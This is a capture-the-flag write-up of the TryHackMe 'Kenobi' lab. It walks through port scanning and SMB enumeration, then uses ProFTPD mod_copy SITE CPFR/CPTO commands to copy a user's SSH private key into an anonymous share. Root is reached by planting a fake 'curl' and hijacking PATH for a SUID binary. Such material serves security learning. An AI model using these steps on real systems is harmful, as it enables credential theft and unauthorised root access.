<a href="https://tryhackme.com/room/kenobi"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>

# kenobi

This is a walkthrough room covering a number of areas including samba. I came back to try this as a normal boot2root challenge and to see how much I remembered!

## nmap

Initial
```
~/CTF/tryhackme/kenobi$ nmap -A -sC -sV -oN nmap/initial $IP 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 20:23 BST
Nmap scan report for 10.10.6.150
Host is up (0.019s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      36285/udp6  mountd
|   100005  1,2,3      40163/tcp6  mountd
|   100005  1,2,3      43860/udp   mountd
|   100005  1,2,3      47071/tcp   mountd
|   100021  1,3,4      32891/tcp6  nlockmgr
|   100021  1,3,4      40859/tcp   nlockmgr
|   100021  1,3,4      43495/udp   nlockmgr
|   100021  1,3,4      59137/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-08-21T14:23:31-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-21T19:23:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds

```
So 7 ports highlighted here. [Task 1 #2]

All Ports
```
~/CTF/tryhackme/kenobi$ nmap -p- -oN nmap/all_ports $IP 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 20:25 BST
Nmap scan report for 10.10.6.150
Host is up (0.019s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
40859/tcp open  unknown
46707/tcp open  unknown
47071/tcp open  unknown
50727/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
```
A further four ports with unknown services.

## gobuster

### initial
```
~/CTF/tryhackme/kenobi$ gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.6.150
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/21 20:29:52 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/08/21 20:37:48 Finished
===============================================================

```
### secondary - with common.txt
```
~/CTF/tryhackme/kenobi$ gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.6.150
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/21 20:31:01 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/21 20:31:11 Finished
===============================================================

```

## nikto

```
~/CTF/tryhackme/kenobi$ nikto -h $IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.6.150
+ Target Hostname:    10.10.6.150
+ Target Port:        80
+ Start Time:         2020-08-21 20:31:42 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin.html' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Server may leak inodes via ETags, header found with file /, inode: c8, size: 591b6884b6ed2, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3092: /admin.html: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-08-21 20:35:00 (GMT1) (198 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nothing much here to look at.

## smb
As we saw in the nmap scan there is a smb service running. Lets see what it has with smbmap.
# smbclient
```
~/CTF/tryhackme/kenobi$ smbmap -H $IP
[+] Guest session   	IP: 10.10.80.223:445	Name: 10.10.80.223                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (kenobi server (Samba, Ubuntu))

```
So an anonymous account. Lets use smbclient to see if we can get anything and download for review.
```
~/CTF/tryhackme/kenobi$ smbclient //$IP/anonymous
Enter WORKGROUP\karti's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6877092 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (139.0 KiloBytes/sec) (average 139.0 KiloBytes/sec)
smb: \> bye
bye: command not found
smb: \> exit
```
# smbget
We could also have just run smbget to download all the files recursively that we had access to for review. 
```
~/CTF/tryhackme/kenobi$ smbget -R smb://$IP/anonymous
Password for [karti] connecting to //anonymous/10.10.80.223: 
Using workgroup WORKGROUP, user karti
smb://10.10.80.223/anonymous/log.txt                                                                              
Downloaded 11.95kB in 2 seconds
```
Lets check out the log file.
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes

```
I won't post the full file but the interesting areas show that we now have a user called kenobi, with a newly generated id_rsa in the default location of /home directory, as well as confirmation that the FTP application is a version of ProFTPD. Right at the bottom it also shows the anonymous share location which may come in handy later. nmap provided the ProFTPD version details of 1.3.5. Lets check out the website for further clues.

## webpage discovery

Highlighted in the nikto and gobuster common.txt report, we can have a look at the robots.txt and see what it provides us with.

```
User-agent: *
Disallow: /admin.html
```
So when we look at the admin.html, we find a full page gif telling us it is a trap. Still, no harm in reviewing the source code for both main page and the trap warning.

## where to now
Looking at what we know. We have:

1. A username kenobi
1. Location of his ssh id_rsa
1. An ftp application.

Next steps - lets check out the ProFTPD for any exploits.

## searchsploit
```
~/CTF/tryhackme/kenobi$ searchsploit proftpd 1.3.5
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                       | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                             | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                       | linux/remote/36742.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
So from the information already enumerated, we know we want that id_rsa to enable us to log on. So lets us look at the file copy exploit.
```
~/CTF/tryhackme/kenobi$ locate 36742.txt
/usr/share/exploitdb/exploits/linux/remote/36742.txt
~/CTF/tryhackme/kenobi$ cat /usr/share/exploitdb/exploits/linux/remote/36742.txt
Description TJ Saunders 2015-04-07 16:35:03 UTC
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:
---------------------------------
Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@www01a
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /tmp/passwd.copy
250 Copy successful
-----------------------------------------
He provides another, scarier example:
------------------------------
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto <?php phpinfo(); ?>
550 cpto: Permission denied
site cpfr /proc/self/fd/3
350 File or directory exists, ready for destination name
site cpto /var/www/test.php
test.php now contains
----------------------
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): FTP session opened.
2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error opening destination file '/<?php
phpinfo(); ?>' for copying: Permission denied
-----------------------
test.php contains contain correct php script "<?php phpinfo(); ?>" which
can be run by the php interpreter
Source: http://bugs.proftpd.org/show_bug.cgi?id=4169
```
It looks like we can just request the file we need by "Copy File From(CPFR)" and then "Copy To (CPTO)". Lets check out the syntax requirements. We already know that ftp port exists, through nmap but will not accept anonymous access. Lets open up a netcat session to attempt connection.
```
~/CTF/tryhackme/kenobi$ nc $IP 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.80.223]
SITE CPFR /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
SITE CPTO /home/kenobi/share/id_rsa
250 Copy successful
```
Now lets check out the smb anonymous share to see if we have that file.
```
~/CTF/tryhackme/kenobi$ smbclient //$IP/anonymous
Enter WORKGROUP\karti's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 22 07:48:26 2020
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  id_rsa                              N     1675  Sat Aug 22 07:48:26 2020
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6877092 blocks available
smb: \> get id_rsa
getting file \id_rsa of size 1675 as id_rsa (19.7 KiloBytes/sec) (average 19.7 KiloBytes/sec)
smb: \> 
```
Cool. Now we have the id_rsa, we can use it with the username.
```
~/CTF/tryhackme/kenobi$ ssh -i id_rsa kenobi@$IP 
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.201.134 (10.10.201.134)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.201.134' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
<insert-user-flag-here>
kenobi@kenobi:~$ 
```
Great, we have the user flag. Now lets look at privilege escalation.

No password so lets look at SUID checks.
```
$ ls -la /usr/bin/menu 
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
kenobi@kenobi:~$ file /usr/bin/menu 
/usr/bin/menu: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0928a845a7eef506cb3bb698377bf15bfd0dcb47, not stripped

```
/usr/bin/menu stands out as not being default. Lets check it out with files, strings and run it.
```
$ file /usr/bin/menu 
/usr/bin/menu: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0928a845a7eef506cb3bb698377bf15bfd0dcb47, not stripped

```
```
$ strings /usr/bin/menu 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig

```
So it looks like strings is showing us what the actual commands that are being run are.
```
$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sat, 22 Aug 2020 07:00:57 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

```

```
kenobi@kenobi:~$ echo /bin/sh > curl
kenobi@kenobi:~$ chmod 777 curl
kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cd /root	
# ls
root.txt
# cat root.txt
<insert-root-flag-here>
# 
```
Following the instructions for the walkthrough, it took me a little while to understand this. I now have it in my head and hopefully will be able to use the same type of exploits elsewhere.

2. The curl command will return whatever instructions follow it.
2. We create a new curl command that outputs to a shell, and as we are running it as root, we will have root shell access.
2. Ensure that the file we created is accessible by all - chmod to 777
2. Change the PATH so that it runs our curl command.
2. Gain root access!!


I thoroughly enjoyed this walkthrough room, especially coming back to do this write-up.

It is definitely more noticeable that the more I do these room, the more I learn and the easier it becomes.

Thanks go to ![tryhackme](https://tryhackme.com/p/tryhackme) for this room. Much appreciated.

Regards

K

<script src="https://tryhackme.com/badge/65208"></script>
